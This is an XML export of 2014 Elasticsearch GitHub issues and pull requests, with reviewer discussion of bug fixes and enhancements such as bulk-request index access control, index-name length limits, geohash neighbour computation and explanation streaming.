username="">colings86</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T13:43:11Z</created><updated>2014-08-15T11:52:41Z</updated><resolved>2014-08-15T11:52:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-13T14:47:37Z" id="52058402">Right, this is odd, caused by the fact that usually you just want to either expand to open or open and closed, not closed only.

One other thing that I noticed is that it is not possible to disable expanding wildcards from the REST layer, while it would be possible from the java api I think.
</comment><comment author="martijnvg" created="2014-08-14T12:24:26Z" id="52176420">@javanna You're right this issue doesn't manifest when used from the Java api.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix explanation streaming</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7257</link><project id="" key="" /><description>Complex explanations were always read as Explanations. Depending
on if the response was streamed or not the explanation was
therefore generated by a ComplexExplanation or by a regular
Explanation.
</description><key id="40150977">7257</key><summary>Fix explanation streaming</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T12:51:50Z</created><updated>2015-06-07T19:09:56Z</updated><resolved>2014-08-27T12:08:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-21T06:16:47Z" id="52882414">I left a couple comments.  Looks fine overall.
</comment><comment author="brwe" created="2014-08-21T14:43:15Z" id="52929733">Thanks for the comments! Added commits.
</comment><comment author="rjernst" created="2014-08-22T05:48:35Z" id="53025533">LGTM.  One oddity in the diff I left a note about.
</comment><comment author="brwe" created="2014-08-26T10:33:11Z" id="53401963">Removed the oddity.
</comment><comment author="rjernst" created="2014-08-26T16:17:35Z" id="53447302">+1 to commit.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title> Ignore allow_explicit_index when accessing root /_bulk URL</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7256</link><project id="" key="" /><description>When url-based access control is used for bulk requests

rest.action.multi.allow_explicit_index: false

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/url-access-control.html
It forbids explicitly setting the index in the request body regardless of the bulk url used.

Would it be possible to allow setting explicit indexes when the URL accessed is the /_bulk root, with no index specified in the URL?

This way if a user is allowed to access /_bulk, he can work as if allow_explicit_index is false, while if a user is only allowed to access specific {index}/_bulk urls, he is effectively contained.

With the current rules, the only way to allow bulk access with explicit index to one user is to set allow_explicit_index to true and thus allow full access to everybody with bulk access.

Maybe this feature is not that high-priority, I see that access control in general does not seem to be the focus of elasticsearch. But if this is an easy change, would this work?
</description><key id="40150751">7256</key><summary> Ignore allow_explicit_index when accessing root /_bulk URL</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/uboness/following{/other_user}', u'events_url': u'https://api.github.com/users/uboness/events{/privacy}', u'organizations_url': u'https://api.github.com/users/uboness/orgs', u'url': u'https://api.github.com/users/uboness', u'gists_url': u'https://api.github.com/users/uboness/gists{/gist_id}', u'html_url': u'https://github.com/uboness', u'subscriptions_url': u'https://api.github.com/users/uboness/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/211019?v=4', u'repos_url': u'https://api.github.com/users/uboness/repos', u'received_events_url': u'https://api.github.com/users/uboness/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/uboness/starred{/owner}{/repo}', u'site_admin': False, u'login': u'uboness', u'type': u'User', u'id': 211019, u'followers_url': u'https://api.github.com/users/uboness/followers'}</assignee><reporter username="">fizmat</reporter><labels><label>discuss</label></labels><created>2014-08-13T12:48:43Z</created><updated>2015-11-21T17:08:22Z</updated><resolved>2015-11-21T17:08:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="erick-blanchard" created="2014-12-11T08:12:52Z" id="66585486">Hello!

I am having the same issue in our logstash+elasticsearch setup. When using bulk output in logstash, it sends:
POST /_bulk HTTP/1.1
host: bar01
connection: keep-alive
content-length: 856
{"index":{"_id":null,"_index":"bla","_type":"gelf"}}
{"version":"1.0","host":"foo","short_message":"11-Dec-2014 07:17:00:011","level":5,"facility":"xxx","@version":"1","@timestamp":"2014-12-11T07:17:00.000Z","source_host":"1.1.1.1", &lt;snip&gt;,"logstash_processor":"bar0","tags":["_grokparsefailure"]}

and gets this when rest.action.multi.allow_explicit_index: false in the config (when the option is set to true, the bulk index succeeds):
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=UTF-8
Content-Length: 101
{"error":"ElasticsearchIllegalArgumentException[explicit index in bulk is not allowed]","status":400}

I see in the history that https://github.com/elasticsearch/elasticsearch/commit/dfdf269a3f3f72fdfece7614975d6c596df68f0d was submitted as a fix, however I am wondering if we don't reach this throw in line 301 of src/main/java/org/elasticsearch/action/bulk/BulkRequest.java in master branch:

while ((token = parser.nextToken()) != XContentParser.Token.END_OBJECT) {
  if (token == XContentParser.Token.FIELD_NAME) {
    currentFieldName = parser.currentName();
  } else if (token.isValue()) {
    if ("_index".equals(currentFieldName)) {
      if (!allowExplicitIndex) {
        throw new ElasticsearchIllegalArgumentException("explicit index in bulk is not allowed");
      }
    index = parser.text();
    ...

I will check if I can workaround it as maybe it's not possible to remove the exception at this point of the function without breaking the purpose of the allowExplicitIndex boolean. Anyway I hope this can help.
</comment><comment author="malpani" created="2015-04-02T17:33:32Z" id="88982554">+1 - this feature will be pretty useful to have for _bulk, _mget and _msearch APIs as it provides means to have secure URL based access control and not restrict other users who have complete access from hitting multiple indices
</comment><comment author="clintongormley" created="2015-11-21T17:08:22Z" id="158662558">I'd really prefer not to add silent exceptions here.  Either explicit indices are allowed or they aren't.  Otherwise we'd have to rename the setting to `rest.action.multi.allow_explicit_index_unless_no_index_specified: false`...

For the Logstash issue, i'd suggest opening an issue on https://github.com/logstash-plugins/logstash-output-elasticsearch/ to add support for including the index name at the top level of the bulk request.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adjusted BroadcastShardOperationResponse subclasses visibility</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7255</link><project id="" key="" /><description>Adjusted `BroadcastShardOperationResponse` subclasses visibility to package private when possible.
Also replaced `int`,`String` pair with `ShardId` that holds the same info and serializes it the same way.
Replaced shardId and index getters in `BroadcastOperationRequest` with a single `ShardId` getter that allows us to reuse the same object in responses.
</description><key id="40147606">7255</key><summary>Adjusted BroadcastShardOperationResponse subclasses visibility</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T12:01:05Z</created><updated>2015-06-07T12:24:28Z</updated><resolved>2014-08-13T15:38:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T12:40:35Z" id="52042441">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>VerboseProgress(PrintWriter) does not set the writer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7254</link><project id="" key="" /><description /><key id="40137703">7254</key><summary>VerboseProgress(PrintWriter) does not set the writer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T09:34:05Z</created><updated>2015-06-07T19:10:21Z</updated><resolved>2014-08-13T09:40:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-08-13T09:34:57Z" id="52027737">LGTM
</comment><comment author="dadoonet" created="2014-08-13T09:40:43Z" id="52028188">Thanks. Pushed in master with 02a90f3684afdf0b3cba203177d4b348a3ebb448 and in 1.x with e7b2735ba569405152fd151a0607aa1923b650a9
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: move plugin dir to plugins dir</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7253</link><project id="" key="" /><description>We should be consistent in our naming for classes and resources.
</description><key id="40137013">7253</key><summary>Test: move plugin dir to plugins dir</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T09:25:19Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-13T09:45:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T09:35:30Z" id="52027776">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Forbid index names over 100 characters in length</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7252</link><project id="" key="" /><description>Fixes #4417

I picked 100 sort of arbitrarily, I'm open to any suggestions for a better limit.
</description><key id="40136615">7252</key><summary>Resiliency: Forbid index names over 100 characters in length</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>breaking</label><label>resiliency</label><label>v1.3.2</label><label>v1.4.0.Beta1</label></labels><created>2014-08-13T09:19:36Z</created><updated>2015-06-06T16:41:28Z</updated><resolved>2014-08-13T13:10:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T09:30:56Z" id="52027374">I was just looking at this page: http://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits and 255 seems to be a common limit across main filesystems? It seems that the limit is in bytes though, so maybe we should also check that index names are in ASCII?
</comment><comment author="dakrone" created="2014-08-13T09:36:53Z" id="52027883">@jpountz I think the name restrictions should fall under #6736, we already have tests for non-ascii names, so I'm not sure we want to make this breaking change in this issue, this is just to prevent DOSing a system.
</comment><comment author="jpountz" created="2014-08-13T10:35:16Z" id="52032638">But then 100 might not be enough, I just applied your patch and ran the following code and was still able to reproduce the issue:

``` java
        final char[] chars = new char[110];
        int c = 6068;
        int len = 0;
        while (true) {
            final int count = Character.toChars(c, chars, len);
            if (len + count &gt; 100) {
                break;
            } else {
                len += count;
            }
        }
        final String indexName = new String(chars, 0, len);
        createIndex(indexName);
```

(This weird String uses a code point that is one UTF16 char but 3 UTF8 bytes, so although its length is less than 100, the number of bytes is greater than 255 which is the limit on my filesystem.)

So I think we either need to decrease the limit (at least for the case when the host encodes file names using UTF8) or enforce that index names are in ASCII first?
</comment><comment author="jpountz" created="2014-08-13T10:39:37Z" id="52032976">Or maybe we could temporarily do something like:

```
if (index is ASCII) {
  maxLength = 255; // common limit for most filesystems
} else {
  maxLength = 80; // protect against crazy chars in index names
}
```
</comment><comment author="dakrone" created="2014-08-13T10:39:50Z" id="52032999">&gt; So I think we either need to decrease the limit (at least for the case when the host encodes file names using UTF8) or enforce that index names are in ASCII first?

What about enforcing it is below 100 UTF-8 bytes? We could use `index.getBytes("UTF-8").length`?
</comment><comment author="jpountz" created="2014-08-13T10:47:02Z" id="52033589">That would work for me.
</comment><comment author="dakrone" created="2014-08-13T10:57:51Z" id="52034407">Closing in favor of #6736
</comment><comment author="dakrone" created="2014-08-13T12:44:45Z" id="52042783">Reopening, this will be back-ported to 1.3.
</comment><comment author="jpountz" created="2014-08-13T12:46:51Z" id="52042989">LGTM
</comment><comment author="nik9000" created="2014-08-13T13:20:43Z" id="52046480">Quick sanity check: my longest index is 44 bytes and I encode a ton of
stuff in that.  What I'm indexing, flavor of index, and time the index was
built.  100 bytes ought to be enough for everyone.
</comment><comment author="KlausBrunner" created="2014-09-30T08:32:13Z" id="57282467">@nik9000 @clintongormley I'm afraid just like 640k back in the day, 100 bytes isn't enough for everyone. We also encode a fair bit of prefix stuff into the index name, and due to the way our customers generate their "external" index names, it just isn't enough for all use cases.

My suggestion would be to make this configurable (with a default of 100), and I'll submit a patch if this has a chance of being accepted.
</comment><comment author="nik9000" created="2014-09-30T13:42:52Z" id="57315059">I suppose I should have surrounded my last sentence with sarcasm tags.  Its certainly enough for me at this point and will probably stay that way for the foreseeable future but I don't claim to speak for everyone.
</comment><comment author="dakrone" created="2014-09-30T13:55:43Z" id="57317014">@KlausBrunner out of curiosity, how long is your longest index name?
</comment><comment author="KlausBrunner" created="2014-09-30T14:05:51Z" id="57318526">@dakrone About 140 characters, which can be a bit more in UTF8 bytes as we allow some non ASCII characters.
</comment><comment author="clintongormley" created="2014-10-14T12:36:58Z" id="59035605">@dakrone any problem with making the limit 255 bytes?
</comment><comment author="dakrone" created="2014-10-14T12:38:19Z" id="59035775">@clintongormley no, no problem with it, that works fine for me.
</comment><comment author="clintongormley" created="2014-10-14T12:39:46Z" id="59035957">ok good - i think we should get that into 1.4?
</comment><comment author="dakrone" created="2014-10-14T12:40:44Z" id="59036070">@clintongormley sure, want to open another issue for it and assign me? I will work on it when I get a chance, shouldn't take too long.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add some @Nullable annotations and fix related compilation warnings.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7251</link><project id="" key="" /><description>Added `@Nullable` to:
- IndicesService.indexService
- IndexService.shard
- IndexService.shardInjector

This change doesn't try to do anything smart but just makes sure that a
*MissingException is thrown instead of a NullPointerException when the requested
object doesn't exist.
</description><key id="40136382">7251</key><summary>Add some @Nullable annotations and fix related compilation warnings.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T09:16:32Z</created><updated>2015-06-07T12:24:39Z</updated><resolved>2014-08-14T12:56:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-14T12:07:44Z" id="52175108">LGTM
</comment><comment author="jpountz" created="2014-08-14T12:56:31Z" id="52179315">Thanks @martijnvg 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add GroovyCollections to the sandbox whitelist</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7250</link><project id="" key="" /><description>Also clarify in the docs that changing the whitelist/blacklist settings
replace the list, they don't add to it.

Fixes #7089
Fixes #7088
</description><key id="40133901">7250</key><summary>Add GroovyCollections to the sandbox whitelist</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Scripting</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T08:41:19Z</created><updated>2015-06-07T12:24:49Z</updated><resolved>2014-08-13T12:48:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T12:42:49Z" id="52042611">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Some type is not shard to all node</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7249</link><project id="" key="" /><description>I found some type of my Elasticsearch cluster is node shard to all node (Have 3 node but shard only 2) and it make cluster too slow. how to fix this problem 
![screen shot 2557-08-05 at 4 32 44 pm](https://cloud.githubusercontent.com/assets/806893/3902755/e44aeb9c-22c2-11e4-99e0-b383eaf398b1.png)
</description><key id="40132376">7249</key><summary>Some type is not shard to all node</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">thangman22</reporter><labels /><created>2014-08-13T08:16:45Z</created><updated>2014-08-13T08:36:25Z</updated><resolved>2014-08-13T08:36:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-13T08:36:25Z" id="52022721">Not an issue. We keep github issues for issues and feature requests.
You could ask your question on the mailing list. If you don't get any answer there, may be you should provide more details or try to formulate the question in another manner.

Closing.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Function Score: Fix explain distance string</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7248</link><project id="" key="" /><description /><key id="40132170">7248</key><summary>Function Score: Fix explain distance string</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Query DSL</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-13T08:13:06Z</created><updated>2015-06-07T19:10:26Z</updated><resolved>2014-08-14T13:59:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T12:55:11Z" id="52043819">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes computation of geohash neighbours</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7247</link><project id="" key="" /><description>The geohash grid it 8 cells wide and 4 cells tall. GeoHashUtils.neighbor(String,int,int.int) set the limit of the number of cells in y to &lt; 3 rather than &lt;= 3 resulting in it either not finding all neighbours or incorrectly searching for a neighbour in a different parent cell.

Closes #7226
</description><key id="40094196">7247</key><summary>Fixes computation of geohash neighbours</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T20:13:28Z</created><updated>2015-06-07T19:10:35Z</updated><resolved>2014-08-13T07:54:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-12T20:25:59Z" id="51971912">I actually think this code should be changed to work out the neighbours from the complete geohash in one go rather than doing it level by level.  This would be more efficient as there is a 20 in 32 chance of a random geohash being on the edge of a parent cell so we end up doing a lot of computation at different levels.  Instead we should decode the full geohash into its odd and even components, add/subtract from the relevant component and then re-encode to get the final result.  It would also make the code a lot easier to follow.

Thoughts?
</comment><comment author="clintongormley" created="2014-08-12T20:33:04Z" id="51972832">That sounds sensible.
</comment><comment author="jpountz" created="2014-08-13T07:00:32Z" id="52016123">LGTM

+1 also to improve the way that neighbors are computed, but I would be totally fine with doing it in another PR.
</comment><comment author="colings86" created="2014-08-13T07:54:46Z" id="52019617">Pushed to master, 1.x and 1.3
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Include groovy community client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7246</link><project id="" key="" /><description>This change includes the a new community: groovy to point to the official client.
</description><key id="40085842">7246</key><summary>Include groovy community client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">blackorzar</reporter><labels><label>docs</label></labels><created>2014-08-12T18:44:37Z</created><updated>2015-04-08T08:03:16Z</updated><resolved>2015-04-05T20:17:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-11T19:43:08Z" id="62606899">Hi @blackorzar 

Please could you sign the CLA so that we can merge this in?
http://www.elasticsearch.org/contributor-agreement/

thanks
</comment><comment author="clintongormley" created="2015-04-05T20:17:02Z" id="89846614">CLA not signed. Closing - feel free to reopen if you sign the CLA
</comment><comment author="blackorzar" created="2015-04-08T01:03:01Z" id="90771868">Hello @clintongormley I just signed the CLA
</comment><comment author="javanna" created="2015-04-08T08:03:11Z" id="90836116">Superseded by #10470
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Function Score: Remove explanation of query score from functions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7245</link><project id="" key="" /><description /><key id="40084979">7245</key><summary>Function Score: Remove explanation of query score from functions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Query DSL</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T18:35:45Z</created><updated>2015-06-07T19:10:40Z</updated><resolved>2014-08-18T14:14:50Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-13T20:12:46Z" id="52103958">The change looks good, maybe we should remove the query explanation from the parameters of `explainScore`? (only the score seems to be needed?)
</comment><comment author="brwe" created="2014-08-14T13:53:55Z" id="52185669">Ok, I removed the query explanation from the parameters of explainScore. However, it was used by ExplainableSearchScript. But this class seems to be used nowhere, so I removed it.
</comment><comment author="jpountz" created="2014-08-18T07:29:45Z" id="52459913">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Core] Make it easier to disable bloom filter indexing</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7244</link><project id="" key="" /><description>We recently turned off bloom filter loading at search time by default (#6349), but we still pay the index-time (and merging) cost to build the bloom filters.  For append-only apps, this is really just unnecessary and we should make it possible to just use Lucene's default Codec/PostingsFormat.
</description><key id="40084367">7244</key><summary>[Core] Make it easier to disable bloom filter indexing</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>enhancement</label></labels><created>2014-08-12T18:29:11Z</created><updated>2015-03-19T14:59:19Z</updated><resolved>2015-01-19T17:13:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2015-01-19T17:13:05Z" id="70528375">We removed bloom filters in 2.0.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Throw IllegalStateException if you try to .addMapping for same type more than once</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7243</link><project id="" key="" /><description>Closes #7231
</description><key id="40083189">7243</key><summary>Throw IllegalStateException if you try to .addMapping for same type more than once</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mikemccand</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-12T18:17:29Z</created><updated>2015-06-07T12:24:59Z</updated><resolved>2014-08-12T18:32:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-12T18:21:13Z" id="51955213">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove `numeric_range` filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7242</link><project id="" key="" /><description>As done with #4034, `numeric_range` filter has been deprecated since 1.0.0.

Closes #7108.
